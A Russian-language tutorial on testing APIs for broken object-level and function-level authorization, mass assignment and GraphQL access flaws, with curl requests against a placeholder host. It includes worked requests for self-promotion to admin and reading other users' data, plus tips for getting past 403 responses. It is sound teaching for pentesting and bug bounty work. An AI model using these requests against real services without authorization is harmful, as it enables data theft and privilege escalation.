## Вопрос, с которого всё начинается

Ты тестируешь API интернет-магазина. Инъекций нет, токены подписаны правильно, CORS настроен. Но у тебя смутное чувство: а проверяет ли сервер, что объект, который ты запрашиваешь, вообще **твой**?

Именно на этом ломается большинство API. Приложение формально работает — оно не даёт подделать запрос, — но забывает спросить: «а это ваш заказ?», «а вам можно эту функцию?», «а это поле вам разрешено менять?». OWASP API Security Top 10 называет эти три класса BOLA, BFLA и mass assignment, и на них приходится львиная доля выплат в bug bounty. Сегодня разберём каждый на одном примере.

## Наш пример: два своих аккаунта

Возьмём API `api.example`. Чтобы тестировать авторизацию честно, заведём **два своих** аккаунта: A и B. Получим для каждого токен (например, JWT) и дальше будем смотреть, что B может сделать с данными A.

```bash
$ curl -s -X POST https://api.example/v1/login -d '{"user":"a","pass":"..."}' | jq -r .token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...   # TOKEN_A
$ curl -s -X POST https://api.example/v1/login -d '{"user":"b","pass":"..."}' | jq -r .token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...   # TOKEN_B
```

Два токена — два «человека». Дальше всё тестирование — это попытки B получить то, что принадлежит A.

## Шаг 1: BOLA — доступ к чужому объекту

**BOLA** (Broken Object Level Authorization) — это IDOR в мире API: ты аутентифицирован, но обращаешься к объекту, который тебе не принадлежит, просто поменяв идентификатор. Пусть A создаст документ:

```bash
$ curl -s -X POST https://api.example/v1/documents -H "Authorization: Bearer $TOKEN_A" \
>   -H 'Content-Type: application/json' -d '{"title":"secret A"}' | jq .
{"id":5001,"title":"secret A","ownerId":111}
```

Документ получил `id=5001` и владельца `ownerId=111` (это аккаунт A). Теперь B пытается прочитать его же:

```bash
$ curl -s https://api.example/v1/documents/5001 -H "Authorization: Bearer $TOKEN_B"
{"id":5001,"title":"secret A","ownerId":111}
```

B получил **данные A**. Значит, сервер проверил только «объект существует», но не «объект принадлежит тебе». Это BOLA, и доказательство — чужие данные в ответе.

Проверять нужно все формы идентификаторов: числа (`1001`), UUID (часто утекают в других ответах), составные пути (`/users/42/orders/7`), ID в теле (`{"orderId":1002}`) и аргументы GraphQL.

## Шаг 2: BFLA — доступ к чужой функции

**BFLA** (Broken Function Level Authorization) — родственная проблема, но про **действие**, а не объект: тебе не положена функция по роли, а API её выполняет. UI админские ручки обычно скрывает, но сам эндпоинт живёт.

```bash
$ curl -s -o /dev/null -w '%{http_code}\n' https://api.example/v1/admin/stats -H "Authorization: Bearer $TOKEN_B"
200
$ curl -s https://api.example/v1/admin/stats -H "Authorization: Bearer $TOKEN_B" | jq .
{"users":4820,"revenue":128400}
```

Обычный пользователь B получил админскую статистику. Частая причина — защиту повесили на UI, а не на сервер. Обязательно проверяй **все методы** на одном пути: бывает, что `GET` защищён, а `DELETE` — нет.

## Шаг 3: mass assignment — лишние поля

**Mass assignment** — приложение автоматически «распаковывает» присланный JSON в объект модели, включая поля, которые пользователь менять не должен. Попробуем повысить себе роль, добавив поля к обычному обновлению профиля:

```bash
$ curl -s -X PATCH https://api.example/v1/users/me -H "Authorization: Bearer $TOKEN_B" \
>   -H 'Content-Type: application/json' -d '{"name":"b","role":"admin","isAdmin":true}'
```

Важно: не верь коду ответа `200` — **прочитай объект обратно** и убедись, что поле реально применилось:

```bash
$ curl -s https://api.example/v1/users/me -H "Authorization: Bearer $TOKEN_B" | jq '.role,.isAdmin'
"admin"
true
```

Вот теперь это доказано: B стал админом. Подсказка, что API уязвим к mass assignment: ответ содержит больше полей, чем ты отправлял (`role`, `createdAt`, `balance`), и имена полей совпадают с колонками базы.

## Шаг 4: GraphQL — те же проблемы, один эндпоинт

В GraphQL всё это живёт на одном URL `/graphql`, поэтому авторизацию часто проверяют на уровне маршрута («пустили — значит можно»), а не на каждом поле. Интроспекция раскрывает схему:

```bash
$ curl -s https://api.example/graphql -H 'Content-Type: application/json' \
>   -d '{"query":"{__schema{queryType{fields{name}}}}"}' | jq -r '.data.__schema.queryType.fields[].name'
me
order
user
```

Теперь запрашиваем чужой заказ через аргумент — BOLA на уровне поля:

```bash
$ curl -s https://api.example/graphql -H 'Content-Type: application/json' \
>   -d '{"query":"{order(id:\"1002\"){id owner{email}}}"}' -b cookie_b
{"data":{"order":{"id":"1002","owner":{"email":"victim@corp"}}}}
```

Особенно опасны **вложенные поля**: корень `order` может проверять доступ, а `owner { email }` — нет. И **batching**: несколько запросов в одном HTTP-запросе обходят rate-limit и перебирают ID пачкой.

## Если не сработало

- Получил `403` на «внутреннем» пути — попробуй альтернативы: `/v1/`, `/api/v2/`, `?id=`, другой метод (`PUT`/`DELETE`), старые версии API.
- Массовое присвоение «не сработало» — проверь имена полей: иногда их нужно назвать «как в БД» (`user_role`, `is_admin`, `account_type`). Скрытые параметры ищут `Param Miner`/`arjun`.
- BOLA на числовых ID закрыт — проверь UUID: они часто утекают в письмах, логах и других ответах, поэтому непредсказуемость **не заменяет** проверку владельца.
- «Основной» API защищён — посмотри **мобильный API** и GraphQL: защиту часто ставят только на основной вход.

## Что мы теперь знаем

- BOLA — доступ к чужому **объекту** по ID (IDOR в API).
- BFLA — доступ к чужой **функции** (действию) по роли.
- Mass assignment — сервер присваивает поля, которые менять нельзя.
- Проверять нужно объект, функцию **и** поле — на каждом эндпоинте.
- Для подтверждения нужны **два своих** аккаунта и чужие данные в ответе.
- GraphQL добавляет BOLA на вложенных полях и batching в обход лимитов.
- Всегда читай объект обратно: `200` не значит «применилось».

## На что смотреть дальше

- Не тестируй на чужих объектах — двух своих аккаунтов достаточно.
- Не останавливайся на `403`: ищи альтернативный путь, версию или метод.
- Не считай UUID защитой — он утекает и не проверяет права.
- Помни про вложенные объекты (`/teams/{id}/members/{uid}`): проверка часто стоит только на первом уровне.
- Различай `401` (нет токена) и `403` (нет прав): для BFLA важен именно `403`, которого иногда нет.
- Начни с **инвентаризации**: спецификация (`/openapi.json`), интроспекция GraphQL, JS-бандлы (`katana -jc`) и старые версии (`/api/v1/` рядом с `/api/v2/`) — самое интересное обычно не видно в UI.
- Проверяй **нестандартные методы** (`PUT`, `PATCH`, `DELETE`) там, где `GET` уже защищён: защиту вешают на один метод и забывают про остальные.

## Куда дальше

В следующем уроке мы возьмём один конкретный API-механизм — **webhooks**: сервис сам делает HTTP-запрос по URL, который ты контролируешь. Там те же идеи обернутся в SSRF, подделку подписи и replay. А пока главное запомни: API ломается не на инъекциях, а на вопросах «это ваш объект?», «вам можно эту функцию?», «это поле вам разрешено?».

## Где пригодится

- **CTF (Web):** BOLA/IDOR — классика; «секретный» объект часто отдаёт флаг.
- **Bug bounty:** BOLA и mass assignment — топ-выплаты, находятся вручную двумя аккаунтами.
- **Пентест:** проверка object/function-level authz — обязательный раздел тестирования API.
- **Работа (AppSec/Dev):** whitelisting полей и проверка владельца на каждом резолвере.
